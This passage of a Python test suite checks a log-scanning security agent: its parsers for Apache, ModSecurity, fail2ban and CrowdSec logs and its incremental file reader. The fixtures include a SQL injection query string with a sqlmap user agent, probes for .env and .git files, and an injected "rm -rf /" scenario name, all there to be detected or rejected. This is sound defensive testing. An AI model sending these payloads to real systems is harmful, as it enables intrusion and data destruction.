            f'{T(NOW - 10)} [authz_core:error] [pid 1] [client {A2}:44] AH01630: client denied by server configuration: /var/www/html/.git/config',
            f'{T(NOW - 9)} [core:info] [pid 1] [client {A4}:4] AH00128: File does not exist: /var/www/html/.env',
            f'{T(NOW - 8)} [core:info] [pid 1] [client {A4}:5] AH00128: File does not exist: /var/www/html/favicon.ico',
            f'{T(NOW - 7)} [mpm_event:notice] [pid 1] AH00489: Apache/2.4.58 configured -- resuming normal operations',
        ]
        ev, n, parsed = self.scan(lines)
        self.assertEqual(ev[A1]['src'], {'waf': 1})
        self.assertEqual(ev[A1]['blk'], 1)
        self.assertIn('crstag:attack-sqli', ev[A1]['tok']['waf'])
        self.assertEqual(ev[A3]['tok']['err'], {'req:login': 2})
        self.assertEqual(ev[A2]['tok']['err'], {'req:probe': 1})
        self.assertEqual(ev[A4]['tok']['err'], {'req:probe': 1}, 'favicon is not a probe')
        self.assertEqual((n, parsed), (8, 8))

    def test_ipv6_client_with_a_port(self):
        T = ts_apache_err
        line = f'{T(NOW - 9)} [auth_basic:error] [pid 1] [client {A6}:54321] AH01617: user a: authentication failure for "/": Password Mismatch'
        ev, *_ = self.scan([line])
        self.assertIn(A6, ev)


# ── ModSecurity audit logs ─────────────────────────────────────────────────────

def audit_native(e, ip, uid, ua='sqlmap/1.7', status=403, blocked=True, rules=True, uri="/index.php?id=1%27%20OR%20%271%27%3D%271",
                 cve=None):
    t = time.gmtime(e)
    stamp = f'[{t.tm_mday:02d}/{_MON[t.tm_mon - 1]}/{t.tm_year}:{t.tm_hour:02d}:{t.tm_min:02d}:{t.tm_sec:02d} +0000]'
    msgs = ''
    if rules:
        extra = f' ({cve})' if cve else ''
        msgs += (f'Message: Warning. detected SQLi using libinjection with fingerprint \'s&1c\'{extra} '
                 '[file "/etc/nginx/modsec/rules/REQUEST-942.conf"] [line "66"] [id "942100"] [rev ""] '
                 '[msg "SQL Injection Attack Detected via libinjection"] [data "Matched Data: s&1c"] '
                 '[severity "2"] [ver "OWASP_CRS/4.29.0"] [maturity "0"] [accuracy "0"] [tag "modsecurity"] '
                 f'[tag "attack-sqli"] [tag "paranoia-level/1"] [hostname "example.com"] [uri "/index.php"] [unique_id "{uid}"]\n')
        if blocked:
            msgs += ('Message: Access denied with code 403 (phase 2). Matched "Operator `Ge\' with parameter `5\'" '
                     '[file "/etc/nginx/modsec/rules/REQUEST-949.conf"] [line "114"] [id "949110"] [rev ""] '
                     '[msg "Inbound Anomaly Score Exceeded (Total Score: 5)"] [tag "anomaly-evaluation"] '
                     f'[hostname "example.com"] [uri "/index.php"] [unique_id "{uid}"]\n')
    action = 'Action: Intercepted (phase 2)\n' if blocked else ''
    return (f'--{uid}-A--\n{stamp} {uid}.1 {ip} 54321 192.0.2.10 443\n'
            f'--{uid}-B--\nGET {uri} HTTP/1.1\nHost: example.com\nUser-Agent: {ua}\nAccept: */*\n\n'
            f'--{uid}-F--\nHTTP/1.1 {status}\nContent-Length: 146\nContent-Type: text/html\n\n'
            f'--{uid}-E--\n<html><body>a response body that must never be read or kept</body></html>\n\n'
            f'--{uid}-H--\n{msgs}{action}Stopwatch: 1790000010123456 2345 (- - -)\n'
            f'Producer: ModSecurity for nginx (STABLE)/3.0.12; OWASP_CRS/4.29.0.\nServer: nginx\nEngine-Mode: "ENABLED"\n\n'
            f'--{uid}-Z--\n\n')


class TestModsecAudit(_Agent):
    def scan_native(self, text):
        agg = self.agent._TsAgg(NOW)
        n, parsed = self.agent._ts_scan_modsec_native(text.split('\n'), agg, '/var/log/modsec_audit.log', NOW)
        ev, _ = agg.events()
        return {e['ip']: e for e in ev}, n, parsed

    def test_a_blocked_sql_injection(self):
        ev, n, parsed = self.scan_native(audit_native(NOW - 20, A1, 'c4d8b66b'))
        e = ev[A1]
        self.assertEqual((n, parsed), (1, 1))
        self.assertEqual(e['src'], {'waf': 1})
        self.assertEqual(e['blk'], 1)
        for tok in ('crs:942100', 'crs:949110', 'crstag:attack-sqli', 'req:sqli', 'req:scanner'):
            self.assertIn(tok, e['tok']['waf'], tok)
        self.assertEqual(self.agent._ts_ip(e['ip']), A1)

    def test_a_transaction_with_no_rule_message_is_not_a_waf_event(self):
        """RelevantOnly also logs plain 4xx and 5xx answers."""
        text = audit_native(NOW - 20, A1, 'aaaa1111', status=404, blocked=False, rules=False)
        ev, n, parsed = self.scan_native(text)
        self.assertEqual(ev, {})
        self.assertEqual((n, parsed), (1, 1))

    def test_detection_only_is_an_event_but_not_a_refusal(self):
        ev, *_ = self.scan_native(audit_native(NOW - 20, A1, 'bbbb2222', status=200, blocked=False))
        self.assertEqual(ev[A1]['src'], {'waf': 1})
        self.assertEqual(ev[A1]['blk'], 0)

    def test_a_cve_named_in_a_message_is_kept(self):
        ev, *_ = self.scan_native(audit_native(NOW - 20, A1, 'cccc3333', cve='CVE-2021-44228'))
        self.assertEqual(ev[A1]['cve'], ['CVE-2021-44228'])

    def test_many_transactions_and_a_response_body_are_walked_not_held(self):
        text = ''.join(audit_native(NOW - 100 + i, A1 if i % 2 else A2, f'f{i:07d}') for i in range(40))
        ev, n, parsed = self.scan_native(text)
        self.assertEqual((n, parsed), (40, 40))
        self.assertEqual(ev[A1]['src'], {'waf': 20})
        self.assertNotIn('response body', json.dumps(ev))

    def test_private_clients_and_a_missing_end_are_not_counted(self):
        ev, *_ = self.scan_native(audit_native(NOW - 20, '10.0.0.7', 'dddd4444'))
        self.assertEqual(ev, {})
        unfinished = audit_native(NOW - 20, A1, 'eeee5555').replace('--eeee5555-Z--\n\n', '')
        ev, n, parsed = self.scan_native(unfinished)
        self.assertEqual((ev, parsed), ({}, 0), 'a transaction with no end is not finished')

    def test_the_json_audit_log(self):
        def entry(uid, ip, status=403):
            return json.dumps({'transaction': {
                'client_ip': ip, 'time_stamp': ts_ctime(NOW - 10), 'unique_id': uid,
                'request': {'method': 'GET', 'uri': "/index.php?id=1' OR '1'='1",
                            'headers': {'Host': 'example.com', 'User-Agent': 'sqlmap/1.7'}},
                'response': {'http_code': status},
                'messages': [
                    {'message': 'SQL Injection Attack Detected via libinjection',
                     'details': {'ruleId': '942100', 'tags': ['modsecurity', 'attack-sqli', 'paranoia-level/1']}},
                    {'message': 'Inbound Anomaly Score Exceeded (Total Score: 5)',
                     'details': {'ruleId': '949110', 'tags': ['anomaly-evaluation']}}]}})
        agg = self.agent._TsAgg(NOW)
        n, parsed = self.agent._ts_scan_modsec_json([entry('u1', A1), entry('u2', A1), entry('u3', A2, 200),
                                                      'not json', '{"transaction": 5}'], agg, 'j', NOW)
        ev = {e['ip']: e for e in agg.events()[0]}
        self.assertEqual((n, parsed), (4, 3))
        self.assertEqual(ev[A1]['src'], {'waf': 2})
        self.assertEqual(ev[A1]['blk'], 2, 'a 403 is a refusal even when no message says so')
        self.assertEqual(ev[A2]['blk'], 0)
        for tok in ('crs:942100', 'crstag:attack-sqli', 'req:sqli', 'req:scanner'):
            self.assertIn(tok, ev[A1]['tok']['waf'], tok)


# ── fail2ban and CrowdSec ──────────────────────────────────────────────────────

class TestFail2ban(_Agent):
    def test_found_and_ban_are_evidence_unban_and_restore_are_not(self):
        T = ts_iso_local
        lines = [
            f'{T(NOW - 50)} fail2ban.filter         [1234]: INFO    [sshd] Found {A1} - {T(NOW - 50)[:19]}',
            f'{T(NOW - 48)} fail2ban.filter         [1234]: INFO    [sshd] Found {A1} - {T(NOW - 48)[:19]}',
            f'{T(NOW - 47)} fail2ban.actions        [1234]: NOTICE  [sshd] Ban {A1}',
            f'{T(NOW - 20)} fail2ban.actions        [1234]: NOTICE  [sshd] Unban {A1}',
            f'{T(NOW - 40)} fail2ban.actions        [1234]: NOTICE  [nginx-botsearch] Ban {A2}',
            f'{T(NOW - 39)} fail2ban.actions        [1234]: NOTICE  [recidive] Ban {A2}',
            f'{T(NOW - 38)} fail2ban.actions        [1234]: NOTICE  [sshd] Restore Ban {A3}',
            f'{T(NOW - 37)} fail2ban.actions        [1234]: WARNING [sshd] {A3} already banned',
            f'{T(NOW - 36)} fail2ban.actions        [1234]: ERROR   Failed to execute ban jail \'sshd\' action \'abuseipdb\'',
            f'{T(NOW - 35)} fail2ban.server         [1234]: INFO    Jail \'sshd\' started',
            f'{T(NOW - 34)} fail2ban.filter         [1234]: INFO    [sshd] Found 10.0.0.9 - {T(NOW - 34)[:19]}',
        ]
        agg = self.agent._TsAgg(NOW)
        n, parsed = self.agent._ts_scan_f2b(lines, agg, '/var/log/fail2ban.log', NOW)
        ev = {e['ip']: e for e in agg.events()[0]}
        self.assertEqual((n, parsed), (11, 8))
        self.assertEqual(ev[A1]['ban'], ['sshd'])
        self.assertEqual(ev[A1]['src'], {'f2b': 3})
        self.assertEqual(ev[A1]['tok']['f2b'], {'jail:sshd': 3})
        self.assertEqual(ev[A2]['ban'], ['nginx-botsearch', 'recidive'])
        self.assertNotIn(A3, ev, 'a restored ban is not new')
        self.assertNotIn('10.0.0.9', ev)

    def test_a_jail_name_outside_the_charset_is_dropped(self):
        T = ts_iso_local
        agg = self.agent._TsAgg(NOW)
        self.agent._ts_scan_f2b([f'{T(NOW - 5)} fail2ban.actions [1]: NOTICE  [bad jail;x] Ban {A1}'], agg, 'f', NOW)
        self.assertEqual(agg.events()[0], [])

    def test_ipv6_ban(self):
        T = ts_iso_local
        agg = self.agent._TsAgg(NOW)
        self.agent._ts_scan_f2b([f'{T(NOW - 5)} fail2ban.actions        [1]: NOTICE  [sshd] Ban {A6}'], agg, 'f', NOW)
        self.assertEqual(agg.events()[0][0]['ip'], A6)


def cs_alert(aid, scenario, ip, origin='crowdsec', scope='Ip', events=6, kind='ban', simulated=False, decisions=True,
             e=NOW - 30):
    iso = time.strftime('%Y-%m-%dT%H:%M:%S', time.gmtime(e))
    a = {'id': aid, 'scenario': scenario, 'events_count': events, 'simulated': simulated,
         'start_at': iso + '.123456789Z', 'stop_at': iso + '.987654321Z', 'created_at': iso + 'Z',
         'source': {'scope': scope, 'value': ip, 'ip': ip, 'cn': 'DE'}}
    if decisions:
        a['decisions'] = [{'origin': origin, 'type': kind, 'scope': 'Ip', 'value': ip, 'duration': '3h59m'}]
    return a


class TestCrowdSec(_Agent):
    def scan(self, alerts, last=0):
        agg = self.agent._TsAgg(NOW)
        n, usable, newest = self.agent._ts_cscli_alerts(json.dumps(alerts), agg, NOW, last)
        ev = {e['ip']: e for e in agg.events()[0]}
        return ev, n, usable, newest

    def test_only_local_scenarios_count(self):
        alerts = [
            cs_alert(130, 'crowdsecurity/ssh-bf', A1),
            cs_alert(129, 'crowdsecurity/vpatch-CVE-2023-1234', A2, events=1),
            {'id': 128, 'scenario': 'update : +5000/-100 IPs', 'source': {'scope': 'crowdsecurity/community-blocklist'}},
            cs_alert(127, 'crowdsecurity/http-probing', A3, origin='CAPI'),
            cs_alert(126, 'crowdsecurity/http-probing', A4, origin='lists'),
            cs_alert(125, 'crowdsecurity/http-sqli-probing', '1.2.3.5', simulated=True),
            cs_alert(124, 'crowdsecurity/ssh-bf', '185.220.101.0/24', scope='Range'),
            cs_alert(123, 'crowdsecurity/ssh-bf', '10.0.0.8'),
            cs_alert(122, "manual 'ban' from 'localhost'", '8.8.4.4', origin='cscli'),
        ]
        ev, n, usable, newest = self.scan(alerts)
        self.assertEqual(set(ev), {A1, A2})
        self.assertEqual(newest, 130)
        self.assertEqual(ev[A1]['src'], {'cs': 6})
        self.assertEqual(ev[A1]['dec'], 1)
        self.assertEqual(ev[A1]['tok']['cs'], {'cs:crowdsecurity/ssh-bf': 1})
        self.assertEqual(ev[A2]['cve'], ['CVE-2023-1234'])
        self.assertGreaterEqual(usable, 7)

    def test_an_alert_is_counted_once_by_id(self):
        alerts = [cs_alert(10, 'crowdsecurity/ssh-bf', A1), cs_alert(9, 'crowdsecurity/ssh-bf', A2)]
        ev, _, _, newest = self.scan(alerts, last=9)
        self.assertEqual(set(ev), {A1})
        self.assertEqual(newest, 10)

    def test_an_alert_with_no_decision_is_evidence_but_not_confirmation(self):
        ev, *_ = self.scan([cs_alert(5, 'crowdsecurity/http-probing', A1, decisions=False, events=12)])
        self.assertEqual((ev[A1]['dec'], ev[A1]['src']), (0, {'cs': 12}))

    def test_a_scenario_name_that_is_not_a_name_is_dropped(self):
        ev, *_ = self.scan([cs_alert(5, "evil'; rm -rf /", A1), cs_alert(6, 'a' * 200, A2)])
        self.assertEqual(ev, {})

    def test_empty_null_and_unexpected_output(self):
        agg = self.agent._TsAgg(NOW)
        for text in ('', 'null', '[]', 'not json', '{"a": 1}', '"x"'):
            self.assertEqual(self.agent._ts_cscli_alerts(text, agg, NOW, 7)[0], 0, text)
        self.assertEqual(self.agent._ts_cscli_alerts('[1, "x", {"id": 3}]', agg, NOW, 0)[:2], (1, 0),
                         'one alert-shaped entry, none usable')

    def test_the_command_run_and_what_it_does_without_cscli(self):
        a = self.agent
        a._which = lambda prog, _c={}: None
        info, last = a._ts_scan_cscli(a._TsAgg(NOW), NOW, 4)
        self.assertEqual((info['state'], last), ('missing', 4))
        calls = []

        class R:
            returncode, stdout, stderr = 0, json.dumps([cs_alert(8, 'crowdsecurity/ssh-bf', A1)]), ''

        def fake_run(argv, **kw):
            calls.append(argv)
            return R()
        a._which = lambda prog, _c={}: '/usr/bin/cscli'
        real = a.subprocess.run
        a.subprocess.run = fake_run
        try:
            agg = a._TsAgg(NOW)
            info, last = a._ts_scan_cscli(agg, NOW, 0)
        finally:
            a.subprocess.run = real
        self.assertEqual((info['state'], last), ('ok', 8))
        self.assertEqual(calls[0][:4], ['/usr/bin/cscli', 'alerts', 'list', '-o'], 'fixed arguments, no shell')
        self.assertTrue(all(isinstance(x, str) for x in calls[0]))


# ── reading a log incrementally ────────────────────────────────────────────────

class TestReader(_Agent):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix='rp-ts-read-'))
        self.addCleanup(shutil.rmtree, self.tmp, ignore_errors=True)
        self.agent.HOST_ROOT = str(self.tmp)
        self.addCleanup(setattr, self.agent, 'HOST_ROOT', '')
        (self.tmp / 'var/log').mkdir(parents=True)
        self.log = self.tmp / 'var/log/x.log'

    def read(self, st=None, audit=False):
        return self.agent._ts_read_log('/var/log/x.log', st or {}, audit)

    def test_first_read_takes_the_tail_and_drops_the_fragment(self):
        a = self.agent
        old = a.THREAT_FIRST_READ
        a.THREAT_FIRST_READ = 100
        self.addCleanup(setattr, a, 'THREAT_FIRST_READ', old)
        self.log.write_text(''.join(f'line {i:03d} xxxxxxxxxxxx\n' for i in range(50)))
        lines, st, status = self.read()
        self.assertEqual(status, 'ok')
        self.assertTrue(lines[0].startswith('line '), 'a mid-line start must not leak a fragment')
        self.assertEqual(lines[-2], 'line 049 xxxxxxxxxxxx')
        self.assertEqual(lines[-1], '')
        self.assertLess(len(lines), 10)

    def test_only_new_lines_after_the_first_read(self):
        self.log.write_text('a\nb\n')
        lines, st, _ = self.read()
        self.assertEqual([x for x in lines if x], ['a', 'b'])
        self.assertEqual(self.read(st)[2], 'idle')
        with open(self.log, 'a') as f:
            f.write('c\nd\n')
        lines, st2, status = self.read(st)
        self.assertEqual(([x for x in lines if x], status), (['c', 'd'], 'ok'))

    def test_a_line_the_writer_has_not_finished_waits(self):
        self.log.write_text('a\nb\nhalf a li')
        lines, st, _ = self.read()
        self.assertEqual([x for x in lines if x], ['a', 'b'])
        with open(self.log, 'a') as f:
            f.write('ne\n')
        lines, st, _ = self.read(st)
        self.assertEqual([x for x in lines if x], ['half a line'])

    def test_rotation_starts_the_new_file_from_the_top(self):
        self.log.write_text('old1\nold2\n')
        _, st, _ = self.read()
        os.rename(self.log, self.tmp / 'var/log/x.log.1')
        self.log.write_text('new1\n')
        lines, st2, status = self.read(st)
        self.assertEqual([x for x in lines if x], ['new1'])
        self.assertNotEqual(st['ino'], st2['ino'])

    def test_a_truncated_file_starts_again(self):
        self.log.write_text('x' * 500 + '\n')
        _, st, _ = self.read()
        with open(self.log, 'w') as f:       # copytruncate: same inode, smaller
            f.write('fresh\n')
        lines, st2, status = self.read(st)
        self.assertEqual([x for x in lines if x], ['fresh'])

    def test_a_missing_log_and_a_directory(self):
        self.assertEqual(self.read()[2], 'missing')
        self.log.mkdir()
        self.assertEqual(self.read()[2], 'unsupported')

    @unittest.skipIf(os.geteuid() == 0, 'root reads anything')
    def test_an_unreadable_log_says_denied_and_keeps_its_place(self):
        self.log.write_text('a\n')
        _, st, _ = self.read()
        os.chmod(self.log, 0)
        self.addCleanup(os.chmod, self.log, 0o600)
        lines, st2, status = self.read(st)
        self.assertEqual((lines, status, st2), ([], 'denied', st))

    def test_one_line_bigger_than_the_cap_is_skipped_not_waited_for_forever(self):
        a = self.agent
        old = a.THREAT_READ_CAP
        a.THREAT_READ_CAP = 1000
        self.addCleanup(setattr, a, 'THREAT_READ_CAP', old)
        self.log.write_text('y' * 5000 + '\nnext\n')
        lines, st, status = self.read({'ino': os.stat(self.log).st_ino, 'pos': 0})
        self.assertEqual(st['pos'], 1000, 'it moved on')
        for _ in range(10):
            lines, st, status = self.read(st)
        self.assertEqual(st['pos'], os.path.getsize(self.log))

    def test_an_audit_log_is_consumed_to_the_end_of_its_last_complete_transaction(self):
        done = audit_native(NOW - 20, A1, 'aaaa0001')
        started = audit_native(NOW - 10, A2, 'aaaa0002').replace('--aaaa0002-Z--\n\n', '')
        self.log.write_text(done + started)
        lines, st, status = self.read(audit=True)
        self.assertIn(st['pos'], (len(done.encode()), len(done.encode()) - 1),
                      'to the end of the last complete transaction, not into the next')
        self.assertEqual(status, 'ok')
        with open(self.log, 'a') as f:
            f.write('--aaaa0002-Z--\n\n')
        lines, st, _ = self.read(st, audit=True)
        self.assertTrue(any('aaaa0002-A--' in ln for ln in lines), 'the finished transaction arrives whole')
        self.assertIn(st['pos'], (os.path.getsize(self.log), os.path.getsize(self.log) - 1))

    def test_a_json_audit_log_is_read_by_line(self):
        self.log.write_text('{"transaction": {}}\n{"transaction": {}}\n{"half')
        lines, st, _ = self.read(audit=True)
        self.assertEqual(len([x for x in lines if x]), 2)

    def test_the_log_is_only_ever_opened_for_reading(self):
        import inspect
        src = inspect.getsource(self.agent._ts_read_log)
        body = src.split('"""', 2)[2]              # the code, not its docstring
        self.assertIn("open(real, 'rb')", body)
        for bad in ("'w'", "'a'", "'r+'", 'os.unlink', 'os.remove', 'os.rename', '.truncate(', 'os.chmod'):
            self.assertNotIn(bad, body, bad)


if __name__ == '__main__':
    unittest.main()
